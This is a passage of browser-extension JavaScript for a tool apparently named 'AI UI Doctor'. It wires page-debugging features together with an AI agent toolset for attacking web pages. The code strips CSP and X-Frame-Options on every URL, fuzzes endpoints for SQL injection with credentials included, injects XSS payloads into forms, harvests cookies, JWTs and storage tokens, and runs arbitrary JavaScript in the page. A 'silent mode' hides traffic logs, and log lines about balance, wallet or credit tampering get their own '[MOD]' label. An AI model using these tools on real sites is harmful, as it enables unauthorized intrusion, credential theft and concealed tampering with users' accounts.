        + (r.responseHeaders ? '\n   resH: ' + JSON.stringify(r.responseHeaders).slice(0, 300) : '')
        + (r.bodySnippet ? '\n   body: ' + r.bodySnippet.slice(0, 300) : '')).join('\n');
    status('Asking AI...');
    const res = await aiRequest('network', user);
    lastFix = { lang: res.lang || 'js', code: res.code };
    showResult('Network analysis', res.raw || res.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});

$('#analyzeRuntime').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    const state = await bg({ type: 'GET_DEBUG_STATE', tabId: id });
    if (!state.attached) { status('Attach the debugger first.', 'error'); return; }
    const mem = await bg({ type: 'GET_MEMORY', tabId: id });
    if (!state.deepErrors.length && !mem.metrics) {
      status('No runtime issues yet. Interact with the page and retry.', 'ok'); return;
    }
    const user = `URL: ${activeTabUrl}\nMemory: ${JSON.stringify(mem.metrics).slice(0, 400)}\n`
      + `Runtime errors (${state.deepErrors.length}):\n`
      + state.deepErrors.map((e, n) =>
        `${n + 1}. [${e.type}${e.level ? '/' + e.level : ''}] ${e.text}`
        + (e.detail ? '  // ' + e.detail.slice(0, 200) : '')
        + (e.url ? `  @ ${e.url}:${e.line}` : '')
        + (e.stack ? '\n   stack: ' + e.stack : '')).join('\n');
    status('Asking AI...');
    const res = await aiRequest('deep', user);
    lastFix = { lang: res.lang || 'js', code: res.code };
    showResult('Runtime + memory analysis', res.raw || res.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});

$('#deobfuscate').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    const sel = await send(id, { type: 'GET_SELECTED' });
    let code = sel.data?.codeText;
    if (!code) {
      const list = await send(id, { type: 'LIST_SCRIPTS' });
      const inline = list.data.find((s) => !s.src && s.inlineLength > 50);
      if (inline) {
        const got = await send(id, { type: 'GET_SCRIPT', matcher: inline.index });
        code = got.data?.code;
      }
    }
    if (!code) { status('Select a <script>, <pre>, <code>, or code-like element first.', 'error'); return; }
    code = code.slice(0, 6000);
    status('Asking AI...');
    const res = await aiRequest('deobfuscate', `Code:\n${code}`);
    lastFix = { lang: 'js', code: res.code };
    showResult('Deobfuscated JS', res.raw || res.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});

function renderNetList(list) {
  const el = $('#netList');
  if (!list.length) { el.classList.add('hidden'); el.innerHTML = ''; return; }
  el.classList.remove('hidden');
  el.innerHTML = list.slice(-15).map((r) =>
    `<div class="row-item"><span class="status-bad">${r.status || r.error || '?'}</span> ${r.method || ''} ${escapeHtml(r.url || '')}</div>`
  ).join('');
}

$('#refactorBtn').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    status('Capturing minified DOM...');
    const dom = await send(id, { type: 'GET_FULL_DOM' });
    const scan = await send(id, { type: 'SCAN' });
    const user = `URL: ${dom.data.url}\nTitle: ${dom.data.title}\n`
      + `Top issues:\n${scan.data.issues.slice(0, 10).map((i) => '- ' + i.type + ' @ ' + i.selector).join('\n') || 'none'}\n`
      + `Structure:\n${dom.data.structure.slice(0, 4000)}\n`
      + `Sample CSS:\n${dom.data.css.slice(0, 4000)}`;
    status('Asking AI...');
    const res = await aiRequest('refactor', user);
    lastFix = { lang: 'css', code: res.code };
    showResult('Global CSS refactor', res.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});
$('#injectVars').addEventListener('click', async () => {
  const css = $('#globalVars').value.trim();
  if (!css) return status('Enter some CSS first.', 'error');
  try {
    const { id } = await getActiveTab();
    await send(id, { type: 'APPLY_GLOBAL_VARS', css });
    status('Global CSS injected.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});
$('#listScripts').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    const res = await send(id, { type: 'LIST_SCRIPTS' });
    const el = $('#scriptList');
    el.classList.remove('hidden');
    el.innerHTML = res.data.length
      ? res.data.map((s) =>
          `<div class="row-item">#${s.index} ${s.src ? escapeHtml(s.src) : '(inline ' + s.inlineLength + ' chars) ' + escapeHtml(s.preview || '')}</div>`
        ).join('')
      : '<div class="row-item">No scripts found.</div>';
  } catch (err) { status(err.message, 'error'); }
});
$('#replaceScript').addEventListener('click', async () => {
  const matcher = $('#scriptMatch').value.trim();
  const code = $('#scriptCode').value;
  if (!matcher || !code) return status('Provide both a match and replacement code.', 'error');
  try {
    const { id } = await getActiveTab();
    await send(id, { type: 'REPLACE_SCRIPT', matcher, code });
    status('Script replaced. Use Revert All to restore.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});

async function refreshHeaderRules() {
  try {
    const { rules } = await bg({ type: 'LIST_HEADER_RULES' });
    const el = $('#hdrList');
    if (!rules.length) {
      el.innerHTML = '<div class="row-item">No active rules.</div>'; return;
    }
    el.innerHTML = rules.map((r) => {
      const reqs = (r.requestHeaders || []).map((h) => `req ${h.op} ${h.name}${h.op === 'remove' ? '' : '=' + escapeHtml(h.value)}`).join(', ');
      const ress = (r.responseHeaders || []).map((h) => `res ${h.op} ${h.name}${h.op === 'remove' ? '' : '=' + escapeHtml(h.value)}`).join(', ');
      return `<div class="row-item"><div style="flex:1">
        <div><strong>${escapeHtml(r.urlFilter)}</strong></div>
        <div>${escapeHtml(reqs || ress)}</div>
      </div><button class="tiny" data-del="${r.id}">×</button></div>`;
    }).join('');
    el.querySelectorAll('button[data-del]').forEach((btn) => {
      btn.addEventListener('click', async () => {
        await bg({ type: 'DELETE_HEADER_RULE', id: +btn.dataset.del });
        refreshHeaderRules();
      });
    });
  } catch (err) { status(err.message, 'error'); }
}

$('#addHdrRule').addEventListener('click', async () => {
  const urlFilter = $('#hdrUrl').value.trim() || '*';
  const name = $('#hdrName').value.trim();
  const value = $('#hdrValue').value;
  const phase = $('#hdrPhase').value;
  if (!name) return status('Header name is required.', 'error');
  const [scope, opRaw] = phase.split('-');
  const op = opRaw === 'remove' ? 'remove' : 'set';
  const headers = [{ name, op, value: op === 'remove' ? undefined : value }];
  const rule = {
    urlFilter,
    requestHeaders: scope === 'request' ? headers : [],
    responseHeaders: scope === 'response' ? headers : [],
  };
  try {
    await bg({ type: 'ADD_HEADER_RULE', rule });
    $('#hdrName').value = ''; $('#hdrValue').value = '';
    status('Rule added (session-scoped).', 'ok');
    refreshHeaderRules();
  } catch (err) { status(err.message, 'error'); }
});

$('#clearHdrRules').addEventListener('click', async () => {
  try {
    await bg({ type: 'CLEAR_HEADER_RULES' });
    status('All header rules cleared.', 'ok');
    refreshHeaderRules();
  } catch (err) { status(err.message, 'error'); }
});

$('#disableCsp').addEventListener('click', async () => {
  try {
    const rule = {
      urlFilter: '*',
      requestHeaders: [],
      responseHeaders: [
        { name: 'content-security-policy', op: 'remove' },
        { name: 'content-security-policy-report-only', op: 'remove' },
        { name: 'x-frame-options', op: 'remove' },
      ],
    };
    await bg({ type: 'ADD_HEADER_RULE', rule });
    status('CSP & X-Frame-Options strip rule added (session-only). Reload the page.', 'ok');
    refreshHeaderRules();
  } catch (err) { status(err.message, 'error'); }
});

$('#readState').addEventListener('click', async () => {
  try {
    const { id, url } = await getActiveTab();
    const res = await send(id, { type: 'EXTRACT_HIDDEN_STATE' });

    let globals = {};
    try {
      const [{ result }] = await chrome.scripting.executeScript({
        target: { tabId: id },
        world: 'MAIN',
        func: () => {
          const pick = (obj) => {
            try { return obj ? JSON.stringify(obj).slice(0, 1500) : null; } catch { return '[unserializable]'; }
          };
          const w = window;
          return {
            __INITIAL_STATE__: pick(w.__INITIAL_STATE__),
            __PRELOADED_STATE__: pick(w.__PRELOADED_STATE__),
            __NEXT_DATA__: pick(w.__NEXT_DATA__),
            __NUXT__: pick(w.__NUXT__),
            __APOLLO_STATE__: pick(w.__APOLLO_STATE__),
            __REDUX_STATE__: pick(w.__REDUX_STATE__),
            hasReduxDevtools: !!w.__REDUX_DEVTOOLS_EXTENSION__,
          };
        },
      });
      globals = result || {};
    } catch (_) {}

    let cookieDump = [];
    try {
      const c = await bg({ type: 'GET_COOKIES', url });
      cookieDump = c.cookies;
    } catch (_) {}
    const dump = { ...res.data, windowGlobals: globals, allCookies: cookieDump };
    securityFindings.push({ type: 'hidden-state', summary: summarizeHiddenState(dump) });
    showResult('Hidden state dump', JSON.stringify(dump, null, 2).slice(0, 8000));
    status('Read complete.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});

function summarizeHiddenState(d) {
  return `hidden inputs: ${d.hiddenInputs.length}, ` +
    `localStorage keys: ${Object.keys(d.localStorage).length}, ` +
    `sessionStorage keys: ${Object.keys(d.sessionStorage).length}, ` +
    `cookies: ${d.allCookies.length}, ` +
    `globals present: ${Object.entries(d.windowGlobals || {}).filter(([_, v]) => v).map(([k]) => k).join(', ') || 'none'}`;
}

$('#runSqlFuzz').addEventListener('click', async () => {
  const url = $('#sqlUrl').value.trim();
  if (!url) return status('Endpoint URL is required.', 'error');
  const params = $('#sqlParams').value.split(',').map((s) => s.trim()).filter(Boolean);
  const method = $('#sqlMethod').value;
  const body = $('#sqlBody').value || null;
  try {
    status('Fuzzing...');
    const res = await bg({
      type: 'SQL_FUZZ',
      target: { url, method, params, body, headers: { 'Content-Type': 'application/json' } },
    });
    if (!res.findings.length) {
      showResult('SQL fuzz', 'No SQL error signatures or 5xx returned.');
      status('Clean.', 'ok'); return;
    }
    const summary = res.findings.map((f, n) =>
      `${n + 1}. ${f.param}=${f.payload} -> ${f.status || f.error || '?'} ${f.matched || ''}\n   ${(f.snippet || '').slice(0, 200)}`
    ).join('\n');
    securityFindings.push({ type: 'sql-injection', summary, raw: res.findings });
    showResult(`SQL fuzz (${res.findings.length} hits)`, summary);
    status('Findings recorded.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});

$('#loadForms').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    const res = await send(id, { type: 'LIST_FORMS' });
    const sel = $('#formPick');
    sel.innerHTML = '<option value="">— pick a form —</option>' +
      res.data.map((f) =>
        `<option value="${f.index}">#${f.index} ${escapeHtml(f.method)} ${escapeHtml(f.action)} (${f.fields.length} fields)</option>`
      ).join('');
    status(`Found ${res.data.length} form(s).`, 'ok');
  } catch (err) { status(err.message, 'error'); }
});

$('#runXss').addEventListener('click', async () => {
  const formIndex = $('#formPick').value;
  if (formIndex === '') return status('List forms and pick one first.', 'error');
  try {
    const { id } = await getActiveTab();
    status('Testing XSS payloads...');
    const res = await send(id, { type: 'XSS_TEST', formIndex: +formIndex });
    if (!res.findings.length) {
      showResult('XSS test', 'No reflected payloads detected.');
      status('Clean.', 'ok'); return;
    }
    const summary = res.findings.map((f, n) =>
      `${n + 1}. field=${f.field} payload=${f.payload}\n   reflected=${f.reflectedRaw} marker=${f.reflectedMarker} escaped=${f.escaped}\n   ${(f.snippet || '').slice(0, 200)}`
    ).join('\n');
    securityFindings.push({ type: 'xss-reflection', summary, raw: res.findings });
    showResult(`XSS reflections (${res.findings.length})`, summary);
    status('Findings recorded.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});

const JWT_RE = /\b([A-Za-z0-9_-]{8,})\.([A-Za-z0-9_-]{8,})\.([A-Za-z0-9_-]{8,})\b/g;
const TOKEN_KEY_RE = /(token|jwt|auth|bearer|session|access|id_token|refresh)/i;

function decodeJwt(token) {
  const parts = token.split('.');
  if (parts.length !== 3) return null;
  const b64urlDecode = (s) => {
    s = s.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    try { return JSON.parse(atob(s)); } catch { return null; }
  };
  const header = b64urlDecode(parts[0]);
  const payload = b64urlDecode(parts[1]);
  if (!header || !payload) return null;
  return { header, payload };
}

function scanForTokens(source, store) {
  const hits = [];
  for (const [k, v] of Object.entries(store || {})) {
    const value = typeof v === 'string' ? v : JSON.stringify(v || '');
    const matches = value.match(JWT_RE) || [];
    for (const tok of matches) {
      const decoded = decodeJwt(tok);
      if (decoded) hits.push({ source, key: k, type: 'JWT', token: tok.slice(0, 80) + '...', decoded });
    }
    if (TOKEN_KEY_RE.test(k) && value.length > 8 && !matches.length) {
      hits.push({ source, key: k, type: 'token-like', valueSnippet: value.slice(0, 120) });
    }
  }
  return hits;
}

$('#findTokens').addEventListener('click', async () => {
  try {
    const { id, url } = await getActiveTab();
    const state = await send(id, { type: 'EXTRACT_HIDDEN_STATE' });
    const cookies = await bg({ type: 'GET_COOKIES', url });
    const cookieStore = {};
    cookies.cookies.forEach((c) => (cookieStore[c.name] = c.value));
    const hiddenStore = {};
    state.data.hiddenInputs.forEach((h) => (hiddenStore[h.name || h.id || '?'] = h.value));

    const all = [
      ...scanForTokens('cookie', cookieStore),
      ...scanForTokens('localStorage', state.data.localStorage),
      ...scanForTokens('sessionStorage', state.data.sessionStorage),
      ...scanForTokens('hidden-input', hiddenStore),
    ];

    if (!all.length) {
      showResult('Token finder', 'No JWTs or token-like values found.');
      status('Clean.', 'ok');
      return;
    }

    const summary = all.map((h, n) => {
      let line = `${n + 1}. [${h.source}] ${h.key} (${h.type})`;
      if (h.decoded) {
        const exp = h.decoded.payload.exp
          ? new Date(h.decoded.payload.exp * 1000).toISOString() : 'no exp';
        line += `\n   alg=${h.decoded.header.alg || '?'} exp=${exp}`;
        line += `\n   payload=${JSON.stringify(h.decoded.payload).slice(0, 240)}`;
      } else {
        line += `\n   ${(h.valueSnippet || '').slice(0, 200)}`;
      }
      return line;
    }).join('\n');

    securityFindings.push({ type: 'tokens', summary, raw: all });
    showResult(`Auth tokens (${all.length})`, summary);
    status('Tokens recorded.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});

$('#exportFindings').addEventListener('click', () => {
  if (!securityFindings.length) return status('No findings to export.', 'error');
  const blob = new Blob([JSON.stringify({
    capturedAt: new Date().toISOString(),
    url: activeTabUrl,
    findings: securityFindings,
  }, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `ai-ui-doctor-findings-${Date.now()}.json`;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { a.remove(); URL.revokeObjectURL(url); }, 1000);
  status('Export started.', 'ok');
});

$('#clearFindings').addEventListener('click', () => {
  securityFindings = [];
  status('Findings cleared.', 'ok');
});

$('#aiTriage').addEventListener('click', async () => {
  if (!securityFindings.length) return status('Run a security probe first.', 'error');
  try {
    const user = securityFindings.map((f, n) =>
      `--- Finding ${n + 1}: ${f.type} ---\n${f.summary}`
    ).join('\n\n').slice(0, 6000);
    status('Asking AI...');
    const res = await aiRequest('security', user);
    showResult('Security triage', res.raw || res.code);
    status('');
  } catch (err) { status(err.message, 'error'); }
});

$('#applyFix').addEventListener('click', async () => {
  if (!lastFix) return;
  try {
    const { id } = await getActiveTab();
    if (lastFix.lang === 'js') await send(id, { type: 'APPLY_JS', js: lastFix.code });
    else await send(id, { type: 'APPLY_CSS', css: lastFix.code });
    status('Applied live.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});
$('#revertFix').addEventListener('click', async () => {
  try {
    const { id } = await getActiveTab();
    await send(id, { type: 'REVERT' });
    status('Everything reverted.', 'ok');
  } catch (err) { status(err.message, 'error'); }
});
$('#copyFix').addEventListener('click', async () => {
  if (!lastFix) return;
  await navigator.clipboard.writeText(lastFix.code);
  status('Copied.', 'ok');
});

let agentRunning = false;
let agentStop = false;

function appendLog(level, msg) {
  const log = $('#agentLog');
  log.classList.remove('hidden');
  const div = document.createElement('div');
  div.className = 'log-line lvl-' + level;
  const prefix = ({ plan: '📋 Plan:', running: '▶', done: '✓', error: '✗', info: 'ℹ', final: '🎯' })[level] || '';
  div.textContent = `${prefix} ${msg}`;
  log.appendChild(div);
  log.scrollTop = log.scrollHeight;
  termWrite(level, msg);
}

function clearLog() { $('#agentLog').innerHTML = ''; }

const TERM_TAG = { plan: 'SYS', running: 'REQ', done: 'OK', error: 'ERR', info: 'SYS', final: '✓' };
const TERM_CLS = { plan: 't-sys', running: 't-req', done: 't-ok', error: 't-err', info: 't-sys', final: 't-fin' };

// === SILENT MODE — suppresses verbose traffic noise, shows only critical events ===
let silentMode = false;
// Levels always shown even in silent mode
const SILENT_ALWAYS_SHOW = new Set(['error', 'final']);
// Prefixes that are verbose raw-traffic noise (suppressed in silent mode)
const SILENT_NOISE_RE = /^\[(REQ|RES|OBSERVED|LISTEN|HDR|SMUG|WSMUT|DOM|ULTRA|INTERCEPT|RES)\]/i;

function termWrite(level, msg) {
  const t = $('#terminal');
  if (!t) return;
  // In silent mode, drop verbose traffic lines
  if (silentMode && !SILENT_ALWAYS_SHOW.has(level)) {
    const tag = TERM_TAG[level] || 'SYS';
    const labelledMsg = `[${tag}] ${msg}`;
    if (SILENT_NOISE_RE.test(labelledMsg) || level === 'running' || level === 'done') return;
  }
  const span = document.createElement('span');
  span.className = 't-line ' + (TERM_CLS[level] || 't-sys');
  const ts = new Date().toTimeString().slice(0, 8);
  const tag = TERM_TAG[level] || 'SYS';
  let label = `[${tag}]`;
  if (level === 'running') {
    if (/balance|amount|wallet|credit|tamper/i.test(msg)) label = '[MOD]';
    else label = '[REQ]';
  }
  span.innerHTML = `<span class="t-ts">${ts}</span> ${label} ${escapeHtml(String(msg)).slice(0, 600)}`;
  t.appendChild(span);
  while (t.children.length > 400) t.removeChild(t.firstChild);
  t.scrollTop = t.scrollHeight;
}

// === PROGRESS BAR helpers ===
function progressShow(iter, maxIter, label) {
  const bar = $('#agentProgress');
  const fill = $('#progressFill');
  const lbl = $('#progressLabel');
  if (!bar) return;
  bar.classList.remove('hidden');
  const pct = Math.round((iter / maxIter) * 100);
  if (fill) fill.style.width = pct + '%';
  if (lbl) lbl.textContent = label || `Iter ${iter}/${maxIter} — ${pct}%`;
}
function progressHide() {
  const bar = $('#agentProgress');
  const fill = $('#progressFill');
  const lbl = $('#progressLabel');
  if (bar) bar.classList.add('hidden');
  if (fill) fill.style.width = '0%';
  if (lbl) lbl.textContent = 'Idle';
}

// === HEARTBEAT helpers ===
let _heartbeatTimer = null;
function heartbeatStart(getLabel) {
  heartbeatStop();
  const el = $('#heartbeatMsg');
  const bar = $('#heartbeatBar');
  if (bar) bar.classList.remove('hidden');
  _heartbeatTimer = setInterval(() => {
    const msg = typeof getLabel === 'function' ? getLabel() : String(getLabel);
    if (el) el.textContent = '⏱ ' + msg;
    termWrite('info', '⏱ HEARTBEAT — ' + msg);
  }, 30000);
}
function heartbeatStop() {
  if (_heartbeatTimer) { clearInterval(_heartbeatTimer); _heartbeatTimer = null; }
  const bar = $('#heartbeatBar');
  if (bar) bar.classList.add('hidden');
}
function escapeHtml(s) { return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }

const TOOLS = {
  scan_page: async () => {
    const { id } = await getActiveTab();
    const r = await send(id, { type: 'SCAN' });
    securityFindings.push({ type: 'ui-scan',
      summary: `${r.data.issues.length} UI issues, ${r.data.consoleErrors.length} console errors`,
      raw: r.data });
    return `${r.data.issues.length} UI issues found`;
  },

  read_hidden_state: async () => {
    const { id, url } = await getActiveTab();
    const r = await send(id, { type: 'EXTRACT_HIDDEN_STATE' });
    let globals = {};
    try {
      const [{ result }] = await chrome.scripting.executeScript({
        target: { tabId: id }, world: 'MAIN',
        func: () => {
          const pick = (o) => { try { return o ? JSON.stringify(o).slice(0, 1500) : null; } catch { return '[unserializable]'; } };
          const w = window;
          return {
            __INITIAL_STATE__: pick(w.__INITIAL_STATE__),
            __PRELOADED_STATE__: pick(w.__PRELOADED_STATE__),
            __NEXT_DATA__: pick(w.__NEXT_DATA__),
            __NUXT__: pick(w.__NUXT__),
            __APOLLO_STATE__: pick(w.__APOLLO_STATE__),
            __REDUX_STATE__: pick(w.__REDUX_STATE__),
            hasReduxDevtools: !!w.__REDUX_DEVTOOLS_EXTENSION__,
          };
        },
      });
      globals = result || {};
    } catch (_) {}
    let cookieDump = [];
    try { cookieDump = (await bg({ type: 'GET_COOKIES', url })).cookies; } catch (_) {}
    const dump = { ...r.data, windowGlobals: globals, allCookies: cookieDump };
    securityFindings.push({ type: 'hidden-state',
      summary: `${dump.hiddenInputs.length} hidden inputs, ${Object.keys(dump.localStorage).length} localStorage, ${cookieDump.length} cookies, globals: ${Object.entries(globals).filter(([_,v]) => v).map(([k]) => k).join(', ') || 'none'}`,
      raw: dump });
    return securityFindings[securityFindings.length - 1].summary;
  },

  find_tokens: async () => {
    const { id, url } = await getActiveTab();
    const state = await send(id, { type: 'EXTRACT_HIDDEN_STATE' });
    const cookies = await bg({ type: 'GET_COOKIES', url });
    const cookieStore = {}; cookies.cookies.forEach((c) => (cookieStore[c.name] = c.value));
    const hiddenStore = {}; state.data.hiddenInputs.forEach((h) => (hiddenStore[h.name || h.id || '?'] = h.value));
    const all = [
      ...scanForTokens('cookie', cookieStore),
      ...scanForTokens('localStorage', state.data.localStorage),
      ...scanForTokens('sessionStorage', state.data.sessionStorage),
      ...scanForTokens('hidden-input', hiddenStore),
    ];
    if (all.length) {
      const summary = all.map((h, n) => {
        let line = `${n + 1}. [${h.source}] ${h.key} (${h.type})`;
        if (h.decoded) {
          const exp = h.decoded.payload.exp ? new Date(h.decoded.payload.exp * 1000).toISOString() : 'no exp';
          line += ` alg=${h.decoded.header.alg || '?'} exp=${exp} payload=${JSON.stringify(h.decoded.payload).slice(0, 160)}`;
        }
        return line;
      }).join('\n');
      securityFindings.push({ type: 'tokens', summary, raw: all });
    }
    return `${all.length} token(s) detected`;
  },

  list_forms: async () => {
    const { id } = await getActiveTab();
    const r = await send(id, { type: 'LIST_FORMS' });
    return `${r.data.length} form(s) found`;
  },

  xss_test_all: async () => {
    const { id } = await getActiveTab();
    const forms = (await send(id, { type: 'LIST_FORMS' })).data;
    if (!forms.length) return 'no forms to test';
    const all = [];
    for (let i = 0; i < forms.length; i++) {
      if (agentStop) break;
      try {
        const res = await send(id, { type: 'XSS_TEST', formIndex: i });
        all.push(...res.findings.map((f) => ({ ...f, formIndex: i, formAction: forms[i].action })));
      } catch (e) {
        appendLog('info', `  form #${i} failed: ${e.message}`);
      }
    }
    if (all.length) {
      const summary = all.map((f, n) =>
        `${n + 1}. form#${f.formIndex} ${f.field}=${f.payload} reflected=${f.reflectedRaw} escaped=${f.escaped}`
      ).join('\n');
      securityFindings.push({ type: 'xss-reflection', summary, raw: all });
    }
    return `tested ${forms.length} forms, ${all.length} reflections`;
  },

  add_header: async (params = {}) => {
    const op = params.op || 'set';
    const phase = params.phase || 'request';
    const headerEntry = { name: (params.name || '').toLowerCase(), op };
    if (op === 'set') headerEntry.value = params.value || '';
    const rule = {
      urlFilter: params.urlFilter || '*',
      requestHeaders: phase === 'request' ? [headerEntry] : [],
      responseHeaders: phase === 'response' ? [headerEntry] : [],
    };
    await bg({ type: 'ADD_HEADER_RULE', rule });
    refreshHeaderRules();
    return `header rule added (${phase} ${op} ${headerEntry.name})`;
  },

  inject_css: async (params = {}) => {
    if (!params.css) return 'no CSS provided';
    const { id } = await getActiveTab();
    await send(id, { type: 'APPLY_GLOBAL_VARS', css: params.css });
    return `injected ${params.css.length} chars of CSS`;
  },

  apply_js: async (params = {}) => {
    if (!params.code) return 'no code provided';
    const { id } = await getActiveTab();
    await send(id, { type: 'APPLY_JS', js: params.code });
    return `JS applied (${params.code.length} chars)`;
  },

  run_js: async (params = {}) => {
    if (!params.code) return 'no code provided';
    const { id } = await getActiveTab();
    try {
      const [{ result, error }] = await chrome.scripting.executeScript({
        target: { tabId: id }, world: 'MAIN',
        func: async (codeStr) => {
          try {

            const fn = new Function(`return (async () => { ${codeStr} })();`);
            const out = await fn();
            try { return { ok: true, value: JSON.stringify(out, null, 2) }; }
            catch { return { ok: true, value: String(out) }; }
          } catch (e) { return { ok: false, error: e.message + '\n' + (e.stack || '') }; }
        },
        args: [params.code],
      });
      if (error) return 'execution error: ' + (error.message || error);
      const out = result;
      if (!out) return 'no result returned';
      if (!out.ok) {
        securityFindings.push({ type: 'run_js-error', summary: out.error, raw: { code: params.code, error: out.error } });
        return 'page error: ' + out.error.split('\n')[0];
      }
      const v = (out.value || '').slice(0, 1500);
      securityFindings.push({ type: 'run_js', summary: v, raw: { code: params.code, result: out.value } });
      return 'returned: ' + v.slice(0, 200) + (v.length > 200 ? '…' : '');
    } catch (e) {
      return 'inject failed: ' + e.message + ' (page may block eval via CSP — try disable_csp first)';
    }
  },

  run_fetch: async (params = {}) => {
    if (!params.url) return 'no url provided';
    const r = await bg({ type: 'RUN_FETCH', params });
    if (!r.ok) return 'fetch failed: ' + r.error;
    const summary = `${params.method || 'GET'} ${params.url} -> ${r.status} (${r.fullLength} bytes)`;
    securityFindings.push({
      type: 'run_fetch',
      summary: `${summary}\nbody: ${r.body.slice(0, 600)}${r.truncated ? '…' : ''}`,
      raw: { request: params, response: r },
    });
    return summary;
  },

  sql_fuzz: async (params = {}) => {
    let url = params.url === 'current' || !params.url ? activeTabUrl : params.url;
    let method = (params.method || 'GET').toUpperCase();
    let p = params.params || [];
    if ((!p || !p.length) && method === 'GET') {
      try { p = [...new URL(url).searchParams.keys()]; } catch { p = []; }
    }
    if (method === 'GET' && !p.length) return 'no params to fuzz on this URL';
    const res = await bg({ type: 'SQL_FUZZ', target: {
      url, method, params: p, body: params.body || null,
      headers: { 'Content-Type': 'application/json' },
    } });
    if (res.findings.length) {
      const summary = res.findings.map((f, n) =>
        `${n + 1}. ${f.param}=${f.payload} -> ${f.status || f.error || '?'} ${f.matched || ''}`
      ).join('\n');
      securityFindings.push({ type: 'sql-injection', summary, raw: res.findings });
    }
    return `${res.findings.length} potential SQL hit(s)`;
  },

  attach_debugger: async () => {
    const { id } = await getActiveTab();
    await bg({ type: 'ATTACH_DEBUGGER', tabId: id });
    setAttached(true);
    return 'debugger attached (reload page for full capture)';
  },

  analyze_network: async () => {
    const { id } = await getActiveTab();
    const state = await bg({ type: 'GET_DEBUG_STATE', tabId: id });
    if (!state.networkLog.length) return 'no failing requests captured';
    const user = `URL: ${activeTabUrl}\nFailing requests:\n` +
      state.networkLog.slice(-15).map((r, n) =>
        `${n + 1}. [${r.method || '-'}] ${r.status || r.error || '?'} ${r.url}`
      ).join('\n');
    const res = await aiRequest('network', user);
    securityFindings.push({ type: 'network-triage', summary: (res.raw || '').slice(0, 500) });
    return `analyzed ${state.networkLog.length} failing requests`;
  },

  analyze_runtime: async () => {
    const { id } = await getActiveTab();
    const state = await bg({ type: 'GET_DEBUG_STATE', tabId: id });
    if (!state.attached) return 'debugger not attached, skipping';
    const mem = await bg({ type: 'GET_MEMORY', tabId: id });
    if (!state.deepErrors.length && !mem.metrics) return 'no runtime issues yet';
    const user = `Memory: ${JSON.stringify(mem.metrics).slice(0, 400)}\nErrors:\n` +
      state.deepErrors.map((e, n) => `${n + 1}. [${e.type}] ${e.text}`).join('\n');
    const res = await aiRequest('deep', user);
    securityFindings.push({ type: 'runtime-triage', summary: (res.raw || '').slice(0, 500) });
    return `analyzed ${state.deepErrors.length} runtime errors`;
  },

  disable_csp: async () => {
    const rule = {
      urlFilter: '*', requestHeaders: [],
      responseHeaders: [
        { name: 'content-security-policy', op: 'remove' },
        { name: 'content-security-policy-report-only', op: 'remove' },
        { name: 'x-frame-options', op: 'remove' },
      ],
    };
    await bg({ type: 'ADD_HEADER_RULE', rule });
    refreshHeaderRules();
    return 'CSP & X-Frame-Options strip rule added';
  },

  discover_endpoints: async (params = {}) => {
    const baseTarget = params.base || activeTabUrl;
    if (!isSafeWebUrl(baseTarget)) return 'Cannot scan — navigate to an http/https website first.';
    let origin;
    try { origin = new URL(baseTarget).origin; }
    catch { return 'invalid base url'; }
    const paths = params.deep ? [...COMMON_PATHS, ...DEEP_PATHS] : COMMON_PATHS;
    const found = [];
    const total = paths.length;
    for (let i = 0; i < total; i++) {
      const p = paths[i];
      try {
        const r = await bg({ type: 'RUN_FETCH', params: {
          url: origin + p, method: 'GET', credentials: 'omit',
        } });
        if (r.ok && r.status && r.status !== 404 && r.status !== 0) {
          found.push({ path: p, status: r.status, snippet: (r.body || '').slice(0, 250).replace(/\s+/g, ' ') });
        }
      } catch {}
      await new Promise((res) => setTimeout(res, params.deep ? 20 : 30));
    }
    if (found.length) {
      const summary = found.map((f) => `${f.status}  ${f.path}\n    ${f.snippet}`).join('\n');
      securityFindings.push({ type: 'endpoint-discovery', summary, raw: found });
    }
    renderDiscoverList(found);
    return `tried ${total} paths${params.deep ? ' (DEEP mode)' : ''}, ${found.length} non-404 hit(s)`;
  },

  payload_fuzz: async (params = {}) => {
    const url = (!params.url || params.url === 'current') ? activeTabUrl : params.url;
    const category = params.category || 'sql';
    const method = (params.method || 'GET').toUpperCase();
    const param = params.param;
    const body = params.body;
    const payloads = PAYLOAD_LIB[category];
    if (!url || !payloads) return 'missing url or invalid category';
    const findings = [];
    for (const payload of payloads) {
      let testUrl = url, testBody = body, testHeaders = { 'Content-Type': 'application/json' };
      try {
        if (method === 'GET' && param) {
          const u = new URL(url);
          u.searchParams.set(param, payload);
          testUrl = u.toString();
        } else if (method !== 'GET') {
          testBody = (body || '{{payload}}').replace(/{{payload}}/g, payload);
        }
        const r = await bg({ type: 'RUN_FETCH', params: {
          url: testUrl, method, body: method === 'GET' ? undefined : testBody,
          headers: testHeaders, credentials: 'include',
        } });
        const txt = (r.body || '').toLowerCase();
        const errPattern = /error|exception|stack|fatal|warning|sql|mysql|postgres|sqlite|odbc|syntax|undefined|traceback|panic/;
        const suspicious = r.status >= 500 || r.status === 0 || errPattern.test(txt);
        if (suspicious) {
          findings.push({ payload, status: r.status, snippet: (r.body || '').slice(0, 350) });
        }
      } catch (e) {
        findings.push({ payload, status: 'err', snippet: e.message });
      }
      await new Promise((res) => setTimeout(res, 25));
    }
    if (findings.length) {
      const summary = findings.map((f, n) =>
